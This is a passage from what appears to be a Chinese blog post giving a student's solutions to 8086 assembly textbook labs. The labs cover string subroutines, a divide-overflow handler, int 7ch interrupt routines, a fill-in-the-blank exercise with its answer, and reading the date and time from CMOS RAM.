class="built_in">cx</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">jcxz</span> stop</div><div class="line"><span class="keyword">div</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">di</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">dx</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">jmp</span> devide</div><div class="line"><span class="symbol">stop:</span>   <span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="built_in">di</span></div><div class="line"><span class="symbol">string:</span> <span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">30h</span></div><div class="line"><span class="keyword">mov</span> [<span class="built_in">si</span>], <span class="built_in">bl</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">loop</span> string</div><div class="line"></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">dx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">di</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">ret</span></div><div class="line"><span class="symbol"></span></div><div class="line">show_str:</div><div class="line"><span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">di</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">es</span></div><div class="line"><span class="comment">;using cx, bx, ax, si, di, es</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">160</span></div><div class="line"><span class="keyword">mul</span> <span class="number">dh</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">2</span></div><div class="line"><span class="keyword">mul</span> <span class="built_in">dl</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="built_in">ax</span> <span class="comment">;bx stores address of start character</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">cl</span> <span class="comment">;al stores the color of character</span></div><div class="line"><span class="symbol">char:</span>   <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="built_in">ds</span>:[<span class="built_in">si</span>]</div><div class="line"><span class="keyword">jcxz</span> <span class="meta">zero</span></div><div class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="built_in">al</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">bx</span>+<span class="built_in">di</span>], <span class="built_in">cx</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="number">2</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">jmp</span> char</div><div class="line"><span class="symbol">zero:</span>   <span class="keyword">pop</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">di</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">bx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">ret</span></div><div class="line"></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="实验11-编写子程序"><a href="#实验11-编写子程序" class="headerlink" title="实验11 编写子程序"></a>实验11 编写子程序</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">stack <span class="meta">segment</span></div><div class="line"><span class="built_in">dw</span> <span class="number">8</span> dup (<span class="number">0</span>)</div><div class="line">stack ends</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line"><span class="built_in">db</span> <span class="string">"Beginner's All-purpose Symbolic Instruction Code."</span>, <span class="number">0</span></div><div class="line">data ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">begin:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, stack</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">16</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line"><span class="keyword">call</span> letterc</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol"></span></div><div class="line">letterc:</div><div class="line"><span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">pushf</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="built_in">ds</span>:[<span class="built_in">si</span>]</div><div class="line"><span class="keyword">jcxz</span> <span class="meta">zero</span></div><div class="line"><span class="keyword">cmp</span> <span class="built_in">cl</span>, <span class="number">97</span></div><div class="line"><span class="keyword">jb</span> next</div><div class="line"><span class="keyword">cmp</span> <span class="built_in">cl</span>, <span class="number">122</span></div><div class="line"><span class="keyword">ja</span> next</div><div class="line"><span class="keyword">sub</span> <span class="built_in">cl</span>, <span class="number">20h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>:[<span class="built_in">si</span>], <span class="built_in">cl</span></div><div class="line"><span class="symbol">next:</span>   <span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">jmp</span> start</div><div class="line"><span class="symbol"></span></div><div class="line">zero:   <span class="keyword">popf</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">ret</span></div><div class="line"></div><div class="line">code ends</div><div class="line">end begin</div></pre></td></tr></table></figure>
<h2 id="实验12-编写0号中断的处理程序"><a href="#实验12-编写0号中断的处理程序" class="headerlink" title="实验12 编写0号中断的处理程序"></a>实验12 编写0号中断的处理程序</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset do0</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">200h</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset do0end - offset do0</div><div class="line"></div><div class="line"><span class="keyword">cld</span></div><div class="line"></div><div class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">0</span>], <span class="number">200h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">2</span>], <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol"></span></div><div class="line">do0:</div><div class="line"><span class="keyword">jmp</span> short do0start</div><div class="line"><span class="built_in">db</span> <span class="string">"overflow!"</span></div><div class="line"><span class="symbol">do0start:</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">202h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">12</span>*<span class="number">160</span>+<span class="number">36</span>*<span class="number">2</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">9</span></div><div class="line"><span class="symbol">s:</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">si</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">di</span>], <span class="built_in">al</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="number">2</span></div><div class="line"><span class="keyword">loop</span> s</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol">do0end:</span></div><div class="line"><span class="keyword">nop</span></div><div class="line"></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure>
<h2 id="实验13-编写、应用中断例程"><a href="#实验13-编写、应用中断例程" class="headerlink" title="实验13 编写、应用中断例程"></a>实验13 编写、应用中断例程</h2><ol>
<li><p>编写并安装int 7ch中断例程，功能为显示一个用0结束的字符串，中断例程安装在0:200处。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset print</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">200h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset printend - offset print</div><div class="line"><span class="keyword">cld</span></div><div class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span>], <span class="number">200h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span> + <span class="number">2</span>], <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol"></span></div><div class="line">print:</div><div class="line"><span class="keyword">push</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">dx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">di</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">160</span></div><div class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mul</span> <span class="number">dh</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">dl</span>, <span class="built_in">dl</span></div><div class="line"><span class="keyword">mov</span> <span class="number">dh</span>, <span class="number">0</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="built_in">dx</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">cl</span></div><div class="line"><span class="symbol">printstart:</span></div><div class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, [<span class="built_in">si</span>]</div><div class="line"><span class="keyword">jcxz</span> <span class="meta">zero</span></div><div class="line"><span class="keyword">mov</span> <span class="number">ch</span>, <span class="built_in">al</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>:[<span class="built_in">di</span>], <span class="built_in">cx</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="number">2</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">jmp</span> printstart</div><div class="line"><span class="symbol"></span></div><div class="line">zero:</div><div class="line"><span class="keyword">pop</span> <span class="built_in">di</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">dx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">es</span></div><div class="line"><span class="keyword">iret</span></div><div class="line"><span class="symbol">printend:</span></div><div class="line"><span class="keyword">nop</span></div><div class="line"></div><div class="line">code ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
</li>
<li><p>编写并安装int 7ch中断例程，功能为完成loop指令功能。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset lp</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">200h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, offset lpend - offset lp</div><div class="line"><span class="keyword">cld</span></div><div class="line"><span class="keyword">rep</span> <span class="keyword">movsb</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span>], <span class="number">200h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">7ch</span> * <span class="number">4</span> + <span class="number">2</span>], <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"><span class="symbol"></span></div><div class="line">lp:     <span class="keyword">push</span> <span class="built_in">bp</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bp</span>, <span class="built_in">sp</span></div><div class="line"><span class="keyword">dec</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">jcxz</span> lpret</div><div class="line"><span class="keyword">add</span> [<span class="built_in">bp</span> + <span class="number">2</span>], <span class="built_in">bx</span></div><div class="line"><span class="symbol">lpret:</span>  <span class="keyword">pop</span> <span class="built_in">bp</span></div><div class="line"><span class="keyword">iret</span></div><div class="line"><span class="symbol">lpend:</span>  <span class="keyword">nop</span></div><div class="line"></div><div class="line">code ends</div><div class="line"></div><div class="line">end start</div></pre></td></tr></table></figure>
</li>
<li><p>下面的程序，分别在屏幕的第2、4、6、8行显示4句英文诗，补全程序。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">s1:</span>     <span class="built_in">db</span> <span class="string">'Good,better,best,'</span>, <span class="string">'$'</span></div><div class="line"><span class="symbol">s2:</span>     <span class="built_in">db</span> <span class="string">'Never let it rest,'</span>, <span class="string">'$'</span></div><div class="line"><span class="symbol">s3:</span>     <span class="built_in">db</span> <span class="string">'Till good is better,'</span>, <span class="string">'$'</span></div><div class="line"><span class="symbol">s4:</span>     <span class="built_in">db</span> <span class="string">'And better,best.'</span>, <span class="string">'$'</span></div><div class="line"><span class="symbol">s:</span>      <span class="built_in">dw</span> offset s1, offset s2, offset s3, offset s4</div><div class="line"><span class="symbol">row:</span>    <span class="built_in">db</span> <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span></div><div class="line"><span class="symbol"></span></div><div class="line">start:  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">cs</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, offset s</div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, offset row</div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">4</span></div><div class="line"><span class="symbol">ok:</span>     <span class="keyword">mov</span> <span class="number">bh</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="number">dh</span>, _____</div><div class="line"><span class="keyword">mov</span> <span class="built_in">dl</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">2</span></div><div class="line"><span class="keyword">int</span> <span class="number">10h</span></div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>, _____</div><div class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">9</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line">_________</div><div class="line">_________</div><div class="line"><span class="keyword">loop</span> ok</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line">code ends</div><div class="line">end start</div></pre></td></tr></table></figure>
<p>答案：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[<span class="built_in">si</span>]</div><div class="line">[<span class="built_in">bx</span>]</div><div class="line"><span class="keyword">add</span> <span class="built_in">bx</span>, <span class="number">2</span></div><div class="line"><span class="keyword">inc</span> <span class="built_in">si</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="实验14-访问CMOS-RAM"><a href="#实验14-访问CMOS-RAM" class="headerlink" title="实验14 访问CMOS RAM"></a>实验14 访问CMOS RAM</h2><p>编程，以”年/月/日 时:分:秒”的格式，显示当前的日期，时间。<br>注意：CMOS RAM中存储着系统的配置信息，出了保存时间信息的单元外，不要向其他的单元中写入内容，否则将引起一些系统错误。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">ds</span>:data</div><div class="line"></div><div class="line">data <span class="meta">segment</span></div><div class="line">s <span class="built_in">db</span> <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span></div><div class="line">data ends</div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>  <span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0b800h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">di</span>, <span class="number">160</span> * <span class="number">12</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">6</span></div><div class="line"><span class="symbol"></span></div><div class="line">print:  <span class="keyword">mov</span> <span class="built_in">al</span>, s[<span class="built_in">si</span>]</div><div class="line"><span class="keyword">out</span> <span class="number">70h</span>, <span class="built_in">al</span></div><div class="line"><span class="keyword">in</span> <span class="built_in">al</span>, <span class="number">71h</span></div><div class="line"><span class="keyword">call</span> number</div><div class="line"><span class="keyword">cmp</span> <span class="built_in">si</span>, <span class="number">2</span></div><div class="line"><span class="keyword">jb</span> slash</div><div class="line"><span class="keyword">je</span> space</div><div class="line"><span class="keyword">cmp</span> <span class="built_in">si</span>, <span class="number">5</span></div><div class="line"><span class="keyword">jb</span> colon</div><div class="line"><span class="symbol">next:</span>   <span class="keyword">inc</span> <span class="built_in">si</span></div><div class="line"><span class="keyword">loop</span> print</div><div class="line"></div><div class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></div><div class="line"><span class="keyword">int</span> <span class="number">21h</span></div><div class="line"></div><div class="line"><span class="comment">;al-&gt;number, es:di-&gt;begin</span></div><div class="line"><span class="symbol">number:</span> <span class="keyword">push</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="built_in">al</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">4</span></div><div class="line"><span class="keyword">shr</span> <span class="number">ah</span>, <span class="built_in">cl</span></div><div class="line"><span class="keyword">and</span> <span class="built_in">al</span>, <span class="number">00001111b</span></div><div class="line"><span class="keyword">add</span> <span class="number">ah</span>, <span class="number">30h</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">al</span>, <span class="number">30h</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">di</span>], <span class="number">ah</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">di</span> + <span class="number">2</span>], <span class="built_in">al</span></div><div class="line"><span class="keyword">add</span> <span class="built_in">di</span>, <span class="number">4</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">cx</span></div><div class="line"><span class="keyword">ret</span></div><div class="line"><span class="symbol"></span></div><div class="line">slash:  <span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">di</span>], <span 